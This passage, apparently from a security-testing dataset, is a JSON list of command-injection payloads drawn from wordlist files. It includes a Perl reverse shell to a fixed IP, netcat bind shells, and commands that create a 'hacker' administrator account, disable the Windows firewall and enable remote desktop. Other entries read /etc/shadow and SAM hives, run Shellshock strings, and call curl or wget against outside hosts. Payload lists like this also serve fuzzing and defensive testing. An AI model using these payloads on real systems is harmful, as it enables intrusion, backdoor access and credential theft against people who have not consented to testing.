    "payload": "&& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; echo vulnerable 10",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "eval('echo
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "eval('ls')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "eval('pwd')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "eval('pwd');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "eval('sleep 5')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "eval('sleep 5');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "eval('whoami')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "eval('whoami');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "exec('echo
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "exec('ls')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "exec('pwd')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "exec('pwd');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "exec('sleep 5')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "exec('sleep 5');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "exec('whoami')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "exec('whoami');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";{$_GET[\"cmd\"]}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| id",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";id|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";id;",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&&id",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";id\\n",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ifconfig",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ifconfig",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ifconfig",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "/index.html|id|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ipconfig /all",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ipconfig /all",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ipconfig /all",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$(`ls`)",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ls -l /",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ls -l /",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ls -l /",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ls -laR /etc",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ls -laR /etc",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ls -laR /etc",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ls -laR /var/www",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ls -laR /var/www",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ls -laR /var/www",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ls -l /etc/",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ls -l /etc/",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ls -l /etc/",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ls -l /home/*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ls -l /home/*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ls -l /home/*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "*; ls -lhtR /var/www/",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ls -l /tmp",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ls -l /tmp",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ls -l /tmp",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| ls -l /var/www/*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; ls -l /var/www/*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& ls -l /var/www/*",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<!--#exec cmd=\"/usr/bin/id;-->",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| nc -lvvp 4444 -e /bin/sh|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; nc -lvvp 4444 -e /bin/sh;",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& nc -lvvp 4444 -e /bin/sh &",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "nc -lvvp 4446 -e /bin/sh|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "nc -lvvp 4447 -e /bin/sh;",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| net localgroup Administrators hacker /ADD",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; net localgroup Administrators hacker /ADD",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& net localgroup Administrators hacker /ADD",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| netsh firewall set opmode disable",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; netsh firewall set opmode disable",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& netsh firewall set opmode disable",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";netstat -a;",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| netstat -an",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; netstat -an",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& netstat -an",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| net user hacker Password1 /ADD",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; net user hacker Password1 /ADD",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& net user hacker Password1 /ADD",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| net view",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; net view",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& net view",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "\\nid|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "\\nid;",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "perl -e 'print \"X\"x1024'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|| perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "perl -e 'print \"X\"x16384'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; perl -e 'print \"X\"x2048'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& perl -e 'print \"X\"x2048'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& perl -e 'print \"X\"x2048'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "perl -e 'print \"X\"x2048'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|| perl -e 'print \"X\"x4096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| perl -e 'print \"X\"x4096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; perl -e 'print \"X\"x4096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& perl -e 'print \"X\"x4096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& perl -e 'print \"X\"x4096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "perl -e 'print \"X\"x4096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|| perl -e 'print \"X\"x8096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| perl -e 'print \"X\"x8096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; perl -e 'print \"X\"x8096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& perl -e 'print \"X\"x8096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "perl -e 'print \"X\"x8192'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "perl -e 'print \"X\"x81920'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|| phpinfo()",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| phpinfo()",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "{${phpinfo()}}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";phpinfo()",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";phpinfo();//",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "';phpinfo();//",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& phpinfo()",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "phpinfo();",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<?php system(\"cat /etc/passwd\");?>",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<?php system(\"curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get\");?>",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<?php system(\"curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj\");?>",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<?php system(\"echo
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<?php system(\"sleep 10\");?>",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<?php system(\"sleep 5\");?>",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<?php system(\"wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get\");?>",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "<?php system(\"wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc\");?>",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ":phpversion();",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";${@print(md5(RCEVulnerable))};",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "${@print(\"RCEVulnerable\")}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "${@print(system($_SERVER['HTTP_USER_AGENT']))}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| pwd",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; pwd",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& pwd",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| sleep 1",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; sleep 1",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& sleep 1",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|| sleep 10",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| sleep 10",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; sleep 10",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "{${sleep(10)}}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& sleep 10",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|| sleep 15",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| sleep 15",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; sleep 15",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& sleep 15",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "{${sleep(20)}}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "{${sleep(3)}}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| sleep 5",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; sleep 5",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& sleep 5",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "{${sleep(hexdec(dechex(20)))}}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| sysinfo",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; sysinfo",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& sysinfo",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";system('cat%20/etc/passwd')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('cat C:\\boot.ini');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('cat config.php');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('cat /etc/passwd');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| system('curl https://crowdshield.com/.testing/rce_vuln.txt');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; system('curl https://crowdshield.com/.testing/rce_vuln.txt');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& system('curl https://crowdshield.com/.testing/rce_vuln.txt');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('curl https://crowdshield.com/.testing/rce_vuln.txt')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('curl https://xerosecurity.com/.testing/rce_vuln.txt');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('echo
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| systeminfo",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; systeminfo",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& systeminfo",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('ls')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('pwd')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('pwd');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|| system('sleep 5');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| system('sleep 5');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; system('sleep 5');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "& system('sleep 5');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& system('sleep 5');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('sleep 5')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('sleep 5');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('wget https://xerosecurity.com/.testing/rce_vuln.txt');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('whoami')",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "system('whoami');",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "test*; ls -lhtR /var/www/",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "test* || perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "test* | perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "test* & perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "test* && perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "test*; perl -e 'print \"X\"x16096'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$(`type C:\\boot.ini`)",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&&type C:\\\\boot.ini",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| type C:\\Windows\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; type C:\\Windows\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& type C:\\Windows\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| type C:\\Windows\\repair\\SYSTEM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; type C:\\Windows\\repair\\SYSTEM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& type C:\\Windows\\repair\\SYSTEM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| type C:\\WINNT\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; type C:\\WINNT\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& type C:\\WINNT\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| type %SYSTEMROOT%\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; type %SYSTEMROOT%\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& type %SYSTEMROOT%\\repair\\SAM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| type %SYSTEMROOT%\\repair\\SYSTEM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; type %SYSTEMROOT%\\repair\\SYSTEM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& type %SYSTEMROOT%\\repair\\SYSTEM",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";uname;",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| uname -a",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; uname -a",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& uname -a",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "|/usr/bin/id",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";|/usr/bin/id|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": ";/usr/bin/id|",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$;/usr/bin/id",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;};/usr/bin/perl -e 'print \\\"Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\\";system(\\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\\\");'",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| wget http://crowdshield.com/.testing/rce.txt",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; wget https://crowdshield.com/.testing/rce_vuln.txt",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& wget https://crowdshield.com/.testing/rce_vuln.txt",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "| whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "; whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "' whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "' || whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "' & whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "' && whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "'; whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "\" whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "\" || whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "\" | whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "\" & whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "\" && whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "\"; whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "$(`whoami`)",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&& whoami",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "{{ get_user_file(\"C:\\boot.ini\") }}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "{{ get_user_file(\"/etc/hosts\") }}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "{{ get_user_file(\"/etc/passwd\") }}",
    "category": "command injection",
    "source_file": "command_exec.txt"
  },
  {
    "payload": "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "\";id;\"",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "';id;'",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "\"|id|\"",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "'|id|'",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "|id|",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "\"|/usr/bin/id|\"",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "'|/usr/bin/id|'",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "|/usr/bin/id|",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "\"||/usr/bin/id|\"",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "'||/usr/bin/id|'",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "||/usr/bin/id|",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "|id;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "||/usr/bin/id;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "\"\\n/bin/ls -al\\n\"",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "'\\n/bin/ls -al\\n'",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "\\n/usr/bin/id;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "\\n/usr/bin/id|",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": ";/usr/bin/id\\n",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "|usr/bin/id\\n",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "|nid\\n",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a);id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a;id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a);id;",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a);id|",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a)|id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a|id",
    "category": "command injection",
    "source_file": "command-execution-unix.txt"
  },
  {
    "payload": "a)|id;",
    "category": "command injection",
